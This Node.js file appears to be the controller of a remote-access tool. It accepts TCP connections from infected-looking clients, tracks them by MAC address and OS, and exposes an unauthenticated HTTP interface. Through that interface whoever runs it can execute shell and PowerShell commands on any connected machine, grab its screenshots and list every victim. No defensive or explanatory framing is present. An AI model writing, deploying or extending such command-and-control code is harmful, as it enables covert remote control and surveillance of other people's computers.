const net = require('net');
const http = require('http');
const url = require('url');
const fs = require("fs");

class Client {
    constructor(socket, os, doRequest) {
        this.ip = socket.remoteAddress;
        this.port = socket.remotePort;
        this.os = os;
        this.doRequest = doRequest;
        this.onCompletedArray = [];
        this.currentID = 0;
    }

    onRequestCompleted(result) {
        for (let i = 0; i < this.onCompletedArray.length; i++) {
            if (this.onCompletedArray[i](result)) {
                this.onCompletedArray.splice(i, 1);
            }
        }
    }

    request(type, data, onComplete) {
        let id = this.currentID++;
        this.onCompletedArray.push(function(result) {
            if (result['id'] == id) {
                onComplete(result);
                return true;
            }
            return false;
        });
        data['type'] = type;
        data['id'] = id;
        this.doRequest(data);
    }

    setCommand(command, onComplete, isPSL = false) {
        isPSL = !!isPSL;
        this.request(isPSL ? "psl" : "command", {
            command: command
        }, onComplete);
    }

    takeScreenshot(onComplete) {
        this.request("screenshot", {}, onComplete);
    }
}

JSON.safeParse = function (str) {
    try {
        return this.parse(str);
    } catch (e) {
        return false;
    }
};

const clients = {};

const socketServer = net.createServer(socket => {
    let mac, client, os, fullData = "";
    socket.on('data', chunk => {
        if (chunk.toString().charAt(chunk.toString().length - 1) === "}") {
            fullData += chunk.toString();
            let obj = JSON.safeParse(fullData);
            fullData = "";
            if (obj) {
                if (obj['type'] === 'init') {
                    mac = obj['mac'];
                    os = obj['os'];
                    client = clients[mac] = new Client(socket, os, (data) => {
                        socket.write(encodeURI(JSON.stringify(data)) + "\n");
                    });
                    console.log("Client " + mac + " connected!\nOS: " + os + "\nIP address: " + client.ip + ":" + client.port + "\n");
                } else if (obj['type'] === "result") {
                    client.onRequestCompleted(obj);
                }
            }
        } else fullData += chunk.toString();
    });

    socket.on('end', onEnd);
    socket.on('error', onEnd);

    function onEnd(e) {
        if (e) console.log(e);
        if (clients[mac] !== undefined) {
            clients[mac] = undefined;
            console.log("Client " + mac + " disconnected!");
        }
    }
});

socketServer.listen(8080);

const httpServer = http.createServer((req, res) => {
    let query = url.parse(req.url, true).query;
    if (query != null) {
        if (typeof query['mac'] !== "undefined") {
            if (clients[query['mac']] !== undefined) {
                if (typeof query['command'] !== "undefined") {
                    res.writeHead(200, {'Content-Type': 'text/plain'});
                    clients[query['mac']].setCommand(query['command'], result => res.end(result['result']));
                } else if (typeof query['psl'] !== "undefined") {
                    res.writeHead(200, {'Content-Type': 'text/plain'});
                    clients[query['mac']].setCommand(query['psl'], result => res.end(result['result']), true);
                } else if (typeof query['screenshot'] !== "undefined") {
                    res.writeHead(200, {'Content-Type': 'image/png'});
                    clients[query['mac']].takeScreenshot(result => {
                        console.log("got");
                        res.end(Buffer.from(result['base64'], 'base64').toString());
                    });
                } else {
                    res.end("Unknown operation");
                }
            } else {
                res.end('Such mac is not connected');
            }
        } else if (typeof query['clients'] !== "undefined") {
            res.writeHead(200, {'Content-Type': 'text/plain'});
            let obj = [];
            for (let mac in clients) {
                if (clients.hasOwnProperty(mac) && typeof clients[mac] !== "undefined") {
                    obj.push({
                        mac: mac,
                        ip: clients[mac].ip,
                        port: clients[mac].port,
                        os: clients[mac].os,
                    });
                }
            }
            res.end(JSON.stringify(obj));
        } else if (typeof query['control'] !== "undefined") {
            res.writeHead(200, {'Content-Type': 'text/html'});
            fs.readFile("index.html", "utf8", (err, data) => {
                if (err) {
                    res.end(err.toString());
                } else {
                    res.end(data.toString());
                }
            });
        } else {
            res.end("fuck you");
        }
    } else {
        res.end("wtf");
    }
});

httpServer.listen(6702);